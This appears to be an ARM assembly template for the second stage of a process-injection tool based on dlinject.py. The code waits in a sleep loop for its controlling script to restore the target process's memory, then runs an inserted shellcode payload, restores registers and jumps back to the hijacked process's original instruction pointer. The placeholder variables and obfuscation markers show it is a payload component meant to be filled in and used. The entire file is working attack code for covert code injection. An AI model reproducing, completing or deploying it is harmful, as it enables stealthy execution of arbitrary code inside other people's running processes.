b _start

.globl _start
_start:
// OBFUSCATION_ALLOCATED_MEMORY_ON
// Based on the stage 2 code included with dlinject.py
// no relative offsets required, because everything is done using syscalls


// let the script know it can restore the previous data
	ldr r0, [pc]
	b store_state_ready_for_memory_restore

state_ready_for_memory_restore:
	.word [VARIABLE:STATE_READY_FOR_MEMORY_RESTORE:VARIABLE]
	.balign 4

store_state_ready_for_memory_restore:
	str r0, [r11]
	
// wait for the script to have restored memory, then proceed
// load the value that indicates memory_restored into r8
	ldr r8, [pc]
	b begin_waiting1

state_memory_restored:
	.word [VARIABLE:STATE_MEMORY_RESTORED:VARIABLE]
	.balign 4

begin_waiting1:

// store the sys_nanosleep timer data
	mov r5, pc
	b begin_waiting2

nanosleep_timespec:
	.word [VARIABLE:STAGE_SLEEP_SECONDS:VARIABLE]
	.word [VARIABLE:STAGE_SLEEP_SECONDS:VARIABLE]
	.balign 4

begin_waiting2:

// store the sys_nanosleep timer data
	mov r0, r5
	mov r1, r5

// wait for value at communications address to be [VARIABLE:STATE_MEMORY_RESTORED:VARIABLE] before proceeding
wait_for_script:

	// sleep 1 second
	mov r7, #162             					@ sys_nanosleep
	mov r0, r5
	mov r1, r5
	swi 0x0										@ syscall

	ldr r7, [r11]
	cmp r7, r8
	beq execute_inner_payload
	
	b wait_for_script

execute_inner_payload:
	
	// save any necessary register values before running the inner payload
	push {r11}
	push {r10}
	
	[VARIABLE:SHELLCODE_SOURCE:VARIABLE]

cleanup_and_return:

	// restore the register values now that the inner payload has finished
	pop {r10}
	pop {r11}

[DEALLOCATE_MEMORY]
	// OBFUSCATION_OFF
	// restore registers
	ldmia sp!, {r0-r11}

restoreStackPointer2:	
	
	// load the stored instruction pointer value stored right after this instruction into the program counter register
	ldr pc, [pc]

old_instruction_pointer:
	.word [VARIABLE:INSTRUCTION_POINTER:VARIABLE]
	.balign 4
	// OBFUSCATION_ON

old_instruction_pointer2:
	.word [VARIABLE:INSTRUCTION_POINTER:VARIABLE]
	.balign 4

[VARIABLE:SHELLCODE_DATA:VARIABLE]

[FRAGMENTS]
